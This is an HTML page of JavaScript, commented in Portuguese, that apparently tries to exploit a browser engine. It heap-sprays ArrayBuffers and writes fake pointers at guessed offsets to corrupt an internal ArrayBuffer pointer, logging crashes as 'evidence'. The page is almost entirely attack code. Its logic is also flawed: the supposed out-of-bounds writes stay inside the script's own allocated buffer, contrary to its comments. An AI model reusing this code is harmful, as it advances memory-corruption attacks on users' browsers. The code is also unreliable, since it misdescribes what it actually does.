<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Foco v2: Corrupção de Ponteiro Interno ArrayBuffer ([rsi+10h])</title>
    <style> /* ... (mesmos estilos de log dos scripts anteriores) ... */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>Foco v2: Corrupção de Ponteiro Interno de ArrayBuffer (Alvo: [obj_ptr+10h])</h1>
    <p>Baseado em JSObjectGetArrayBufferByteLength ([obj_ptr+10h] -> ponteiro para contents; [contents_ptr+10h] -> byteLength).
       Tentaremos sobrescrever o ponteiro em [obj_ptr+10h]. Um crash ou mudança no byteLength indica sucesso.</p>
    <label for="pointerValueSelector">Valor do Ponteiro Falso a ser escrito:</label>
    <select id="pointerValueSelector">
        <option value="AABB">0x41414141_42424242 (Crash Test)</option>
        <option value="AAAA">0xAAAAAAAA_AAAAAAAA (Leak Test)</option>
    </select>
    <br><br>
    <button id="runBtn" onclick="runPointerCorruptionTest()">Iniciar Teste de Corrupção de Ponteiro v2</button>
    <div id="output"></div>

    <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const pointerValueSelector = document.getElementById('pointerValueSelector');
        const SHORT_PAUSE = 50;

        const log = (message, type = 'info', funcName = '') => { /* ... implementação do log (copiar do script anterior)... */
            if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
            try {
                const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                if (outputDiv.innerHTML.length > 900000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 450000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
        };
        const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
        const toHex = (val, bits = 32) => { /* ... implementação do toHex (copiar do script anterior)... */
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
            let num = Number(val);
            if (bits <= 32) { num = num >>> 0; }
            const pad = Math.ceil(bits / 4);
            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        };
        const toHex64 = (high, low) => `0x${high.toString(16).toUpperCase().padStart(8, '0')}${low.toString(16).toUpperCase().padStart(8, '0')}`;


        const attemptPointerCorruption = async () => {
            const FNAME = 'attemptPointerCorruption_v2';
            log("--- Iniciando Teste v2: Corrupção de Ponteiro Interno de ArrayBuffer ([obj_ptr+10h]) ---", 'test', FNAME);

            const controlBufferSize = 64; // Tamanho útil do buffer de controle
            let corruptedPointerHigh, corruptedPointerLow;

            const selectedPointerValue = pointerValueSelector.value;
            if (selectedPointerValue === "AAAA") {
                corruptedPointerHigh = 0xAAAAAAAA;
                corruptedPointerLow  = 0xAAAAAAAA;
                log("Usando ponteiro falso: 0xAAAAAAAA_AAAAAAAA", "info", FNAME);
            } else { // AABB ou default
                corruptedPointerHigh = 0x41414141;
                corruptedPointerLow  = 0x42424242;
                log("Usando ponteiro falso: 0x41414141_42424242", "info", FNAME);
            }


            const targetBufferOriginalSize = 64;
            const numTargetBuffers = 250; // Aumentado um pouco o spray
            const targetBuffers = [];
            // let originalByteLengths = []; // Não estritamente necessário se o crash é o principal indicador

            // O allocationSizeControl precisa ser suficiente para o controlBufferSize útil + o maior offsetTotal testado + 8 (para a escrita U64)
            // Maior offset testado será ~80. Então 64 + 80 + 8 = 152. Arredondar para cima.
            const allocationSizeControl = 256;
            let controlBuffer, controlDv;
            try {
                controlBuffer = new ArrayBuffer(allocationSizeControl);
                controlDv = new DataView(controlBuffer);
                // Preencher apenas a parte OOB com um padrão diferente para facilitar a depuração (se possível)
                for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB); // Parte útil
                for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC); // Parte OOB
                log(`Buffer de controle (${allocationSizeControl} bytes) alocado. Útil: ${controlBufferSize} bytes.`, 'info', FNAME);
            } catch (e) {
                log(`Erro ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
                return;
            }

            log(`Alocando ${numTargetBuffers} buffers alvo de ${targetBufferOriginalSize} bytes...`, 'info', FNAME);
            for (let i = 0; i < numTargetBuffers; i++) {
                try {
                    const ab = new ArrayBuffer(targetBufferOriginalSize);
                    targetBuffers.push(ab);
                } catch (e) {
                    log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME);
                    // Se falhar em alocar muitos, pode indicar falta de memória, afetando o layout da heap
                }
            }
            log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
            await PAUSE(100);

            // totalOffset = GapEntreBuffers + TamanhoHeaderAlocadorDoTarget + 0x10h (offset interno para o ponteiro do 'contents')
            // Hipóteses para TamanhoHeaderAlocador: 8, 16, 24, 32 bytes.
            // Hipóteses para GapEntreBuffers: 0, 8, 16 bytes.
            // 0x10h = 16 bytes.
            const totalOffsetsToTry = [
                // Gap 0:
                0 + 8  + 16, // 24
                0 + 16 + 16, // 32
                0 + 24 + 16, // 40
                0 + 32 + 16, // 48
                // Gap 8:
                8 + 8  + 16, // 32 (duplicado, mas ok)
                8 + 16 + 16, // 40 (duplicado)
                8 + 24 + 16, // 48 (duplicado)
                8 + 32 + 16, // 56
                // Gap 16:
                16 + 8  + 16, // 40 (duplicado)
                16 + 16 + 16, // 48 (duplicado)
                16 + 24 + 16, // 56 (duplicado)
                16 + 32 + 16, // 64
                // Adicionar alguns valores em torno e intermediários, e menores
                12, 16, 20, // Inclui o 16 (0+0+16, se não houver header nem gap)
                28, 36, 44, 52, 60, 68, 72, 80
            ];
            const uniqueSortedOffsets = [...new Set(totalOffsetsToTry)].sort((a, b) => a - b);
            log(`Testando ${uniqueSortedOffsets.length} offsets únicos: ${uniqueSortedOffsets.join(', ')}`, 'info', FNAME);


            let corruptionEvidenceFound = false;
            let successOffsetInfo = "";

            // `baseOOBWriteOffset` é o início da área onde a escrita OOB realmente acontece,
            // que é logo após a parte útil do `controlBuffer`.
            const baseOOBWriteOffset = controlBufferSize;

            main_loop:
            for (const tryTotalOffset of uniqueSortedOffsets) {
                if (corruptionEvidenceFound && !confirm("EVIDÊNCIA DE CORRUPÇÃO DETECTADA! Continuar testando outros offsets?")) break;

                // O endereço de escrita é relativo ao início do `controlBuffer`.
                const oobWriteAddress = baseOOBWriteOffset + tryTotalOffset;
                const relOffsetForLog = `ctrlDataEnd+${tryTotalOffset}`; // Logar offset relativo ao fim da *parte útil*
                log(`Tentando escrita OOB U64 (valor ${toHex64(corruptedPointerHigh, corruptedPointerLow)}) em ${relOffsetForLog} (abs no controlBuffer ${oobWriteAddress})`, 'info', FNAME);

                if (oobWriteAddress < 0 || (oobWriteAddress + 8) > controlBuffer.byteLength) {
                    log(`Offset ${relOffsetForLog} (abs ${oobWriteAddress}) está fora dos limites do buffer de controle alocado para U64. Pulando.`, 'warn', FNAME);
                    continue;
                }

                try {
                    controlDv.setUint32(oobWriteAddress, corruptedPointerLow, true);
                    controlDv.setUint32(oobWriteAddress + 4, corruptedPointerHigh, true);
                    log(`Escrita OOB U64 em ${relOffsetForLog} parece OK. Verificando buffers alvo...`, 'info', FNAME);

                    await PAUSE(200); // Pausa um pouco maior

                    for (let i = 0; i < targetBuffers.length; i++) {
                        if (!targetBuffers[i]) continue;
                        try {
                            // A simples tentativa de acessar .byteLength pode causar o crash
                            const currentLength = targetBuffers[i].byteLength;
                            // Se não houve crash, mas o tamanho mudou, é um sinal (menos provável com ponteiro falso AABB)
                            if (currentLength !== targetBufferOriginalSize) {
                                log(`!!! EVIDÊNCIA: ArrayBuffer alvo ${i} byteLength ALTERADO de ${targetBufferOriginalSize} para ${currentLength}!`, 'critical', FNAME);
                                log(`   Offset total (ctrlDataEnd+offset): ${tryTotalOffset}`, 'critical', FNAME);
                                corruptionEvidenceFound = true;
                                successOffsetInfo = `Buffer ${i}, Offset Total ${tryTotalOffset}, Novo Tamanho ${currentLength}`;
                                // break main_loop; // Descomentar para parar no primeiro sinal
                            }
                        } catch (eAccess) {
                            log(`!!! CRASH/ERRO AO ACESSAR byteLength do ArrayBuffer alvo ${i} !!!`, 'critical', FNAME);
                            log(`   Offset total (ctrlDataEnd+offset): ${tryTotalOffset}`, 'critical', FNAME);
                            log(`   Erro: ${eAccess.message}`, 'vuln', FNAME);
                            corruptionEvidenceFound = true;
                            successOffsetInfo = `Buffer ${i}, Offset Total ${tryTotalOffset}, CRASH/Erro ao acessar byteLength`;
                            // break main_loop; // Descomentar para parar no primeiro sinal
                        }
                    }
                    // Restaura os bytes no controlBuffer para o próximo teste de offset
                    // Isso é crucial se não houver crash, para isolar os testes.
                    controlDv.setUint32(oobWriteAddress, 0xCCCCCCCC, true);
                    controlDv.setUint32(oobWriteAddress + 4, 0xCCCCCCCC, true);

                } catch (eWrite) {
                    log(`Escrita OOB U64 em ${relOffsetForLog} FALHOU/Bloqueada: ${eWrite.message}`, 'good', FNAME);
                }
                if (corruptionEvidenceFound && !confirm("EVIDÊNCIA DE CORRUPÇÃO DETECTADA! Continuar testando outros offsets?")) break; // Pergunta novamente após verificar todos os targets para um dado offset
                await PAUSE(50);
            }

            if (corruptionEvidenceFound) {
                log(`--- EVIDÊNCIA DE CORRUPÇÃO DE PONTEIRO ENCONTRADA: ${successOffsetInfo} ---`, 'test', FNAME);
                alert(`EVIDÊNCIA DE CORRUPÇÃO ENCONTRADA!\nDetalhes: ${successOffsetInfo}\nVerifique o console para mais logs.\nO navegador pode estar instável.`);
            } else {
                log("--- Nenhuma evidência de corrupção de ponteiro (crash ou alteração de byteLength) detectada com os offsets testados. ---", 'test', FNAME);
            }
        };

        const runPointerCorruptionTest = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            log("==== INICIANDO TESTE v2 DE CORRUPÇÃO DE PONTEIRO INTERNO [obj_ptr+10h] ====", 'test', 'Main');
            await attemptPointerCorruption();
            log("\n==== TESTE v2 DE CORRUPÇÃO DE PONTEIRO CONCLUÍDO ====", 'test', 'Main');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
